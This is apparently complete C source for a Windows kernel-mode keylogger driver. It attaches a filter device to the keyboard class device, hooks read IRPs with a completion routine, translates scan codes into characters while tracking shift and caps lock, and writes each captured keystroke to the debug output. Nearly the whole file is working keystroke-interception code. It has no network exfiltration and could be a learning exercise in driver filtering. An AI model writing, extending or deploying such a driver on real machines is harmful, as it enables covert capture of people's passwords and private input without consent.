#include <ntddk.h>

void KeyloggerUnload(PDRIVER_OBJECT DriverObject);

PDEVICE_OBJECT NextDevice = NULL;
BOOLEAN ShiftPressed = FALSE;
BOOLEAN CapsLockToggled = FALSE;
BOOLEAN IsExtended = FALSE;
LONG PendingIrps = 0;

NTSTATUS KeyloggerPassThrough(PDEVICE_OBJECT DeviceObject, PIRP Irp);

NTSTATUS OnReadCompletion(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context);
NTSTATUS KeyloggerRead(PDEVICE_OBJECT DeviceObject, PIRP Irp);

const char* MapScanCodeToChar(USHORT makeCode, BOOLEAN shift, BOOLEAN caps, BOOLEAN extended) {
	if (extended) {
		switch (makeCode) {
		case 0x1C: return "[NUM_ENTER]";
		case 0x35: return "/";
		case 0x48: return "[UP]";
		case 0x50: return "[DOWN]";
		case 0x4B: return "[LEFT]";
		case 0x4D: return "[RIGHT]";
		case 0x53: return "[DEL]";
		case 0x38: return "[R_ALT]";
		case 0x1D: return "[R_CTRL]";
		default:   return "";
		}
	}

	BOOLEAN isUppercase = (shift ^ caps);

	switch (makeCode) {
	case 0x1E: return isUppercase ? "A" : "a";
	case 0x30: return isUppercase ? "B" : "b";
	case 0x2E: return isUppercase ? "C" : "c";
	case 0x20: return isUppercase ? "D" : "d";
	case 0x12: return isUppercase ? "E" : "e";
	case 0x21: return isUppercase ? "F" : "f";
	case 0x22: return isUppercase ? "G" : "g";
	case 0x23: return isUppercase ? "H" : "h";
	case 0x17: return isUppercase ? "I" : "i";
	case 0x24: return isUppercase ? "J" : "j";
	case 0x25: return isUppercase ? "K" : "k";
	case 0x26: return isUppercase ? "L" : "l";
	case 0x32: return isUppercase ? "M" : "m";
	case 0x31: return isUppercase ? "N" : "n";
	case 0x18: return isUppercase ? "O" : "o";
	case 0x19: return isUppercase ? "P" : "p";
	case 0x10: return isUppercase ? "Q" : "q";
	case 0x13: return isUppercase ? "R" : "r";
	case 0x1F: return isUppercase ? "S" : "s";
	case 0x14: return isUppercase ? "T" : "t";
	case 0x16: return isUppercase ? "U" : "u";
	case 0x2F: return isUppercase ? "V" : "v";
	case 0x11: return isUppercase ? "W" : "w";
	case 0x2D: return isUppercase ? "X" : "x";
	case 0x15: return isUppercase ? "Y" : "y";
	case 0x2C: return isUppercase ? "Z" : "z";
	case 0x29: return shift ? "~" : "`";
	case 0x02: return shift ? "!" : "1";
	case 0x03: return shift ? "@" : "2";
	case 0x04: return shift ? "#" : "3";
	case 0x05: return shift ? "$" : "4";
	case 0x06: return shift ? "%" : "5";
	case 0x07: return shift ? "^" : "6";
	case 0x08: return shift ? "&" : "7";
	case 0x09: return shift ? "*" : "8";
	case 0x0A: return shift ? "(" : "9";
	case 0x0B: return shift ? ")" : "0";
	case 0x0C: return shift ? "_" : "-";
	case 0x0D: return shift ? "+" : "=";
	case 0x33: return shift ? "<" : ",";
	case 0x34: return shift ? ">" : ".";
	case 0x35: return shift ? "?" : "/";
	case 0x27: return shift ? ":" : ";";
	case 0x28: return shift ? "\"" : "'";
	case 0x1A: return shift ? "{" : "[";
	case 0x1B: return shift ? "}" : "]";
	case 0x2B: return shift ? "|" : "\\";
	case 0x1C: return "\n";
	case 0x39: return " ";
	case 0x0E: return "[BACKSPACE]";
	case 0x01: return "[ESC]";
	case 0x0F: return "[TAB]";
	default:   return "[UNKNOWN]";
	}
}

typedef struct _KEYBOARD_INPUT_DATA {
	USHORT UnitId;
	USHORT MakeCode;
	USHORT Flags;
	USHORT Reserved;
	ULONG  ExtraInformation;
} KEYBOARD_INPUT_DATA, * PKEYBOARD_INPUT_DATA;

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(RegistryPath);

	KdPrint(("Keylogger - DriverEntry\n"));

	DriverObject->DriverUnload = KeyloggerUnload;

	for (int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
		DriverObject->MajorFunction[i] = KeyloggerPassThrough;
	}

	DriverObject->MajorFunction[IRP_MJ_READ] = KeyloggerRead;

	PDEVICE_OBJECT deviceObject;
	NTSTATUS status = IoCreateDevice(DriverObject, 0, NULL, FILE_DEVICE_KEYBOARD, 0, FALSE, &deviceObject);

	if (!NT_SUCCESS(status)) {
		KdPrint(("Keylogger - Failed at IoCreateDevice - Error 0x%X\n", status));

		return status;
	}

	deviceObject->Flags |= (DO_BUFFERED_IO | DO_POWER_PAGABLE);
	deviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

	UNICODE_STRING keyboardName = RTL_CONSTANT_STRING(L"\\Device\\KeyboardClass0");
	status = IoAttachDevice(deviceObject, &keyboardName, &NextDevice);

	if (!NT_SUCCESS(status)) {
		KdPrint(("Keylogger - Failed at IoAttachDevice - Error 0x%X\n", status));

		IoDeleteDevice(deviceObject);

		return status;
	}

	return STATUS_SUCCESS;
}

void KeyloggerUnload(PDRIVER_OBJECT DriverObject) {
	KdPrint(("Keylogger - Unload initiated\n"));

	if (NextDevice) {
		IoDetachDevice(NextDevice);
	}

	LARGE_INTEGER interval;
	interval.QuadPart = -10 * 1000 * 1000; // 1 second

	while (PendingIrps > 0) {
		KdPrint(("Keylogger - Waiting for %ld pending IRPs...\n", PendingIrps));
		KeDelayExecutionThread(KernelMode, FALSE, &interval);
	}

	IoDeleteDevice(DriverObject->DeviceObject);

	KdPrint(("Keylogger - Safely Unloaded\n"));
}

NTSTATUS KeyloggerPassThrough(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);

	IoSkipCurrentIrpStackLocation(Irp);

	return IoCallDriver(NextDevice, Irp);
}

NTSTATUS OnReadCompletion(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context) {
	UNREFERENCED_PARAMETER(DeviceObject);
	UNREFERENCED_PARAMETER(Context);

	if (NT_SUCCESS(Irp->IoStatus.Status)) {
		PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;

		int numberOfKeys = (int)(Irp->IoStatus.Information) / sizeof(KEYBOARD_INPUT_DATA);

		for (int i = 0; i < numberOfKeys; i++) {
			USHORT code = keys[i].MakeCode;
			BOOLEAN isReleased = (keys[i].Flags & 0x01);

			if (code == 0xE0) {
				IsExtended = TRUE;
				continue;
			}

			if (code == 0x2A || code == 0x36) {
				ShiftPressed = isReleased ? FALSE : TRUE;
				IsExtended = FALSE;
				continue;
			}

			if (code == 0x3A && !isReleased) {
				CapsLockToggled = CapsLockToggled ? FALSE : TRUE;
				IsExtended = FALSE;
				continue;
			}

			if (!isReleased) {
				const char* key = MapScanCodeToChar(code, ShiftPressed, CapsLockToggled, IsExtended);
				if (key && key[0] != '\0') {
					KdPrint(("%s", key));
				}
			}

			IsExtended = FALSE;
		}
	}

	InterlockedDecrement(&PendingIrps);

	if (Irp->PendingReturned) {
		IoMarkIrpPending(Irp);
	}

	return Irp->IoStatus.Status;
}

NTSTATUS KeyloggerRead(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);

	InterlockedIncrement(&PendingIrps);

	IoCopyCurrentIrpStackLocationToNext(Irp);

	IoSetCompletionRoutine(Irp, OnReadCompletion, NULL, TRUE, TRUE, TRUE);

	return IoCallDriver(NextDevice, Irp);
}